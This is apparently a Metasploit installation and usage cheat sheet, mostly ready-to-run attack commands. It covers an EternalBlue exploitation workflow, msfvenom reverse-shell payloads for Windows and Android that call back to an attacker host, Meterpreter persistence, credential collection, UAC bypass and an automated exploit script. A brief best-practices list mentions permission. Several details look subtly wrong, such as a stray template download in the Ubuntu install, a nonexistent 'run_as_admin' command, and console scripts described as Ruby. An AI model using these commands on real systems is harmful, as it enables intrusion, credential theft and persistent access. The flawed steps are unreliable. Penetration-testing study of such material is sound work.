# Metasploit Framework Installation and Usage Guide

## Installation

### Prerequisites
- Linux OS (Kali Linux recommended, which includes Metasploit)
- Ruby 2.3+
- PostgreSQL database
- Internet connection
- Root or sudo access

### On Kali Linux (Pre-installed)
Metasploit comes pre-installed on Kali Linux. Just start the service:
```bash
sudo systemctl start postgresql
sudo msfdb init
msfconsole
```

### On Other Linux Distributions

#### Ubuntu/Debian
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wss.erb > /tmp/metasploit-framework-wss.erb
sudo apt-get install postgresql postgresql-contrib
sudo systemctl start postgresql
sudo apt-get install metasploit-framework
```

#### Using Git
```bash
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
gem install bundler
bundle install
```

### On Windows
Download the Windows Installer from https://www.metasploit.com/download

### Verify Installation
```bash
msfconsole --version
```

## Initial Setup

### Initialize Database
```bash
sudo msfdb init
```

### Start Metasploit Console
```bash
msfconsole
```

## Basic Commands

### Information Gathering
```bash
# Search for exploits
search ms17-010

# Search for specific type
search type:exploit platform:windows

# Show exploit details
show options
info exploit/windows/smb/ms17_010_eternalblue
```

### Using an Exploit
```bash
# Select an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set required options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# Show current options
options

# Execute exploit
run
exploit
```

### Payload Generation
```bash
# Generate standalone executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# APK payload for Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
```

## Meterpreter Commands

Once you have a Meterpreter session:
```bash
# Get system information
sysinfo

# Get user information
getuid

# Get current working directory
pwd

# List files
ls

# Upload file
upload /path/to/file

# Download file
download /path/to/remote/file

# Execute command
shell
execute -f cmd.exe
run_as_admin

# Migrate to another process
ps
migrate [PID]

# Establish persistence
persistence -X -i 60 -p 4444 -r 192.168.1.10
```

## Database Commands
```bash
# Show database status
db_status

# Show hosts
hosts

# Show services
services

# Show vulnerabilities
vulns

# Show exploited sessions
sessions
```

## Scanning and Enumeration

### Port Scanning
```bash
# Use Nmap module
use auxiliary/scanner/nmap/nmap
set RHOSTS 192.168.1.0/24
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### Service Discovery
```bash
# FTP Scanner
use auxiliary/scanner/ftp/ftp_version

# SSH Scanner
use auxiliary/scanner/ssh/ssh_version

# HTTP Scanner
use auxiliary/scanner/http/http_version
```

## Post-Exploitation

### Information Gathering
```bash
# Get system information
run post/windows/gather/enum_applications

# Get browser data
run post/windows/gather/credentials/credential_collector

# Enumerate shares
run post/windows/gather/enum_shares
```

### Privilege Escalation
```bash
# Bypass UAC
use exploit/windows/local/bypassuac_eventvwr

# Token impersonation
getsystem
```

## Common Exploitation Workflow

### Step 1: Reconnaissance
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.100
run
```

### Step 2: Vulnerability Discovery
```bash
search ms17-010
```

### Step 3: Exploitation
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
exploit
```

### Step 4: Post-Exploitation
```bash
getsystem
run post/windows/gather/enum_applications
```

## Resource Scripts

Create automation scripts in Ruby:
```ruby
# exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

Run the script:
```bash
msfconsole -r exploit.rc
```

## Best Practices
1. Always get written permission before testing
2. Use separate networks for testing
3. Keep Metasploit updated
4. Document all findings
5. Use VPN for secure connections
6. Never test on production systems
7. Maintain operational security
8. Follow a structured approach
9. Backup your database regularly
10. Follow ethical guidelines

## Updating Metasploit
```bash
sudo apt-get update
sudo apt-get upgrade metasploit-framework

# Or via msfconsole
msfupdate
```

## Useful Resources
- Exploit Database: https://www.exploit-db.com
- Rapid7 Blog: https://blog.rapid7.com
- Community Modules: https://github.com/rapid7/metasploit-framework/tree/master/modules
- Module Development: https://docs.metasploit.com/display/MDT/Module+Development
